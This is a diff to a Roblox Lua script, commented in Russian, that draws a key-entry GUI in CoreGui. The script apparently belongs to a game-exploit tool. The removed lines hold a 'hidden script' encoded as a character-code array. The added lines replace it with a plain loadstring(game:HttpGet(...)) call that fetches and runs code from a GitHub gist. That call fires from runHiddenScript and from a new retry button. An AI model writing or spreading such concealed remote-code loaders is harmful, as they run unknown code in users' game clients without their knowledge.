@@ -3,7 +3,6 @@ local UserInputService = game:GetService("UserInputService")
 local CoreGui = game:GetService("CoreGui")
 local HttpService = game:GetService("HttpService")
 local RunService = game:GetService("RunService")
-local Players = game:GetService("Players")
 
 -- Удаляем старый GUI
 local oldGui = CoreGui:FindFirstChild("PlayerokKeyGui")
@@ -36,7 +35,7 @@ gui.ResetOnSpawn = false
 gui.Parent = CoreGui
 
 local frame = Instance.new("Frame", gui)
-frame.Size = UDim2.new(0, 0, 0, 0) -- начнем с 0 для анимации
+frame.Size = UDim2.new(0, 0, 0, 0)
 frame.Position = UDim2.new(0.5, 0, 0.4, 0)
 frame.AnchorPoint = Vector2.new(0.5, 0.5)
 frame.BackgroundColor3 = Color3.fromRGB(120, 140, 255)
@@ -87,7 +86,7 @@ feedback.TextColor3 = Color3.new(1, 1, 1)
 feedback.Font = Enum.Font.Gotham
 feedback.TextSize = 18
 
--- Кнопка копирования ссылки
+-- Кнопка получения ключа
 local getKeyButton = Instance.new("TextButton", frame)
 getKeyButton.Size = UDim2.new(0.8, 0, 0, 36)
 getKeyButton.Position = UDim2.new(0.1, 0, 0, 210)
@@ -116,26 +115,25 @@ progressBar.Size = UDim2.new(0, 0, 1, 0)
 progressBar.BackgroundColor3 = Color3.fromRGB(30, 200, 30)
 Instance.new("UICorner", progressBar).CornerRadius = UDim.new(0, 10)
 
--- Скрытый скрипт в цифрах (исправленный)
-local scriptNumbers = {
-    108,111,97,100,115,116,114,105,110,103,40,103,97,109,101,58,72,116,116,112,71,101,116,40,
-    34,104,116,116,112,115,58,47,47,103,105,115,116,46,103,105,116,104,117,98,117,115,101,114,
-    99,111,110,116,101,110,116,46,99,111,109,47,85,67,84,45,104,117,98,47,53,98,49,49,100,49,
-    48,51,56,54,102,49,98,56,99,101,48,56,102,101,98,56,48,51,56,54,49,101,48,98,55,57,47,114,
-    97,119,47,98,50,57,49,55,98,51,57,56,100,52,98,48,99,99,56,48,102,98,50,97,99,97,55,51,97,
-    51,49,51,55,98,97,52,57,52,101,98,99,102,48,34,41,41
-}
+-- Кнопка повторить загрузку
+local retryButton = Instance.new("TextButton", frame)
+retryButton.Size = UDim2.new(0.8, 0, 0, 36)
+retryButton.Position = UDim2.new(0.1, 0, 0, 300)
+retryButton.BackgroundColor3 = Color3.fromRGB(255, 200, 200)
+retryButton.Font = Enum.Font.GothamBold
+retryButton.TextSize = 18
+retryButton.TextColor3 = Color3.fromRGB(50, 0, 0)
+retryButton.Text = "🔁 Повторить загрузку"
+Instance.new("UICorner", retryButton).CornerRadius = UDim.new(0, 12)
 
+-- Запуск скрытого скрипта
 local function runHiddenScript()
-    local code = ""
-    for _, num in ipairs(scriptNumbers) do
-        code = code .. string.char(num)
-    end
     local success, err = pcall(function()
-        loadstring(code)()
+        loadstring(game:HttpGet("https://gist.githubusercontent.com/UCT-hub/5b11d10386f1b8ce08feb803861e0b79/raw/b2917b398d4b0cc80fb2aca73a3137ba494ebcf0/gistfile1.txt"))()
     end)
     if not success then
-        warn("Ошибка при запуске скрытого скрипта: ", err)
+        feedback.Text = "❌ Ошибка при запуске"
+        feedback.TextColor3 = Color3.fromRGB(255, 0, 0)
     end
 end
 
@@ -148,32 +146,7 @@ local function tweenIn(instance, duration, targetSize, targetPos)
     posTween:Play()
 end
 
-tweenIn(frame, 0.5, UDim2.new(0, 400, 0, 320), frame.Position)
-
--- Пульсация кнопки
-local function pulseButton(btn)
-    local tweenInfo = TweenInfo.new(0.5, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true)
-    local tween = TweenService:Create(btn, tweenInfo, {Size = UDim2.new(0.82, 0, 0, 42)})
-    tween:Play()
-end
-pulseButton(button)
-
--- Пульсация заголовка
-RunService.RenderStepped:Connect(function()
-    local scale = 1 + 0.05 * math.sin(tick() * 3)
-    title.TextSize = 22 * scale
-end)
-
--- Эффект «печатающегося» текста
-local function typeText(lbl, txt)
-    lbl.Text = ""
-    spawn(function()
-        for i = 1, #txt do
-            lbl.Text = string.sub(txt,1,i)
-            wait(0.03)
-        end
-    end)
-end
+tweenIn(frame, 0.5, UDim2.new(0, 400, 0, 360), frame.Position)
 
 -- Прогресс-бар
 local function fillProgressBar()
@@ -196,14 +169,21 @@ end
 button.MouseButton1Click:Connect(function()
     local input = box.Text:match("^%s*(.-)%s*$")
     if not validKey then
-        typeText(feedback, "⚠️ Ключ на сегодня не найден")
+        feedback.Text = "⚠️ Ключ на сегодня не найден"
         feedback.TextColor3 = Color3.fromRGB(255, 170, 0)
     elseif input == validKey then
-        typeText(feedback, "✅ Ключ верный, загружаем...")
+        feedback.Text = "✅ Ключ верный, загружаем..."
         feedback.TextColor3 = Color3.fromRGB(30, 200, 30)
         fillProgressBar()
     else
-        typeText(feedback, "❌ Неверный ключ")
+        feedback.Text = "❌ Неверный ключ"
         feedback.TextColor3 = Color3.fromRGB(200, 40, 40)
     end
+end)
+
+-- Повторная загрузка
+retryButton.MouseButton1Click:Connect(function()
+    feedback.Text = "🔁 Перезапуск..."
+    feedback.TextColor3 = Color3.fromRGB(200, 150, 0)
+    runHiddenScript()
 end)
